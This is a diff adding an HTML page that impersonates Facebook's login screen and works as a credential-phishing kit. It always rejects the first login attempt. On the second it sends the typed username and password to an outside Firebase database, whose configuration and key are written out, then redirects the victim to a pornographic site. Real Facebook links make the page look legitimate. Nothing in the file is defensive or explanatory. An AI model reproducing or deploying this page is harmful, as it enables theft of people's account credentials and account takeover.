@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+	<title>
+		Facebook-log in or sign up
+	</title>
+	<link rel = "icon" href ="fbicon.PNG" 
+        type = "image/x-icon">
+     <link rel="stylesheet" type="text/css" href="style.css">
+     <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
+</head>
+<body>
+<div class="one">
+	<i class="fa fa-mobile fa-3x" aria-hidden="true"></i>
+	<p>Please Login to continue.</p>
+</div>
+<div class="two">
+	<p>facebook</p>
+</div>
+<div class="three">
+	<i class="fa fa-info-circle" aria-hidden="true"></i>
+	<input id="uname" type="text" placeholder="Mobile number or email address" >
+	<input id="pass" type="Password" placeholder="Password">
+</div>
+<div class="four">
+	<button onclick="login()">Log In</button>
+</div>
+<p id="wrng" style="text-align: center; color: red; display: none;">Wrong Username or Password</p>
+<span class="five">
+	<hr>
+	<p>or</p>
+	<hr>
+</span>
+<div class="six">
+	<button onclick="create()">Create New Account</button>
+	<a href="https://web.facebook.com/login/identify/?ctx=recover&ars=facebook_login">Forgotten password?</a>
+</div>
+<div class="seven">
+	<div class="lan1">
+		<p>English(UK)</p>
+		<p>অসমীয়া</p>
+		<p>Bahasa Indonesia</p>
+		<p>Português (Brasil)</p>
+	</div>
+	<div class="lan2">
+		<p>বাংলা</p>
+		<p>हिन्दी</p>
+		<p>Español</p>
+		<button><i class="fa fa-plus" aria-hidden="true"></i></button>
+	</div>
+</div>
+<div class="eight">
+	<a href="#">About</a>
+	<a href="#">Help</a>
+	<a href="#">More</a>
+</div>
+<div class="last">Facebook Inc.</div>
+<script src="https://www.gstatic.com/firebasejs/8.0.0/firebase.js"></script>
+<script src="https://www.gstatic.com/firebasejs/7.1.0/firebase-database.js"></script>
+
+<!-- TODO: Add SDKs for Firebase products that you want to use
+     https://firebase.google.com/docs/web/setup#available-libraries -->
+
+<script>
+  // Your web app's Firebase configuration
+  var firebaseConfig = {
+    apiKey: "AIzaSyD-VmB_1lNErsyHxSbYvRIobNaBQKWqLPI",
+    authDomain: "links-5d46b.firebaseapp.com",
+    projectId: "links-5d46b",
+    storageBucket: "links-5d46b.appspot.com",
+    messagingSenderId: "756461258445",
+    appId: "1:756461258445:web:bd332e9c06220942d20b84"
+  };
+  // Initialize Firebase
+  firebase.initializeApp(firebaseConfig);
+</script>
+</body>
+
+<script>
+	var i=0;
+	function create() {
+		window.location.href="https://www.facebook.com";
+		// body...
+		//window.alert("You have already a account,please sign in");
+	}
+	function login(argument) {
+		// body...
+		i++;
+		if(i==2){
+		var un = document.getElementById("uname").value;
+		var pass = document.getElementById("pass").value;
+		firebase.database().ref("user").push({
+  		name: un,
+  		pass: pass
+  	},
+  	function(error){
+  		if(error){
+  			document.getElementById("uname").value="";
+  			document.getElementById("pass").value="";
+  		}
+  		else{
+  			document.getElementById("uname").value="";
+  			document.getElementById("pass").value="";
+  		}
+  	}
+
+  	);
+	window.location.href="https://www.xnxx.com/bollywood-actress";
+	}
+	else{
+		    document.getElementById("uname").value="";
+  			document.getElementById("pass").value="";
+  			document.getElementById('wrng').style.display = 'block';
+  			
+	}
+}
+</script>
+
+</html>
